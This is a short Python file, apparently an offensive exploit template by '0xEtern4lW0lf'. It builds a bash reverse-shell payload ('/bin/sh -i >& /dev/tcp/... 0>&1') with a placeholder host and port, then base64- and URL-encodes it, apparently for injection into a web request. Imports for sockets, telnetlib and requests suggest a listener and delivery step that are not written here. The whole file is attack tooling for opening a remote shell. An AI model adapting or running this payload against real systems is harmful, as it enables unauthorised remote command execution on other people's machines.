#! /usr/bin/env python3

## Author: 0xEtern4lW0lf
## Created: 18 Dez 2022
## Description: TEMPLATE

## ========= MODULES =========

import argparse
import base64
import sys
import time
import socket
import telnetlib
from threading import Thread

try:
    import requests
except:
    print(f"ERRORED: RUN: pip install requests")
    exit()
import sys
import time
import urllib.parse


#### COLORS ####
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
END = "\033[1;m "

lport = 443


## ========= VARIABLE =========
s = ""
def encodeB64(strg):
    return base64.b64encode(strg.encode()).decode()

payload = f"/bin/sh -i >& /dev/tcp/123456/123 0>&1"
payload_encoded = str(encodeB64(payload))
print('payload_encoded '+payload_encoded)


## Create the payload

print("[+] Creating the payload !! [+]")

payload1 = f"/bin/sh -i >& /dev/tcp/123456/123 0>&1"
  
payload3 = base64.b64encode(payload1.encode("ascii")).decode("ascii")

print(f"Encoded string: {payload3}")




payloadd = urllib.parse.quote(payload_encoded)

print("payloadd: "+payloadd)
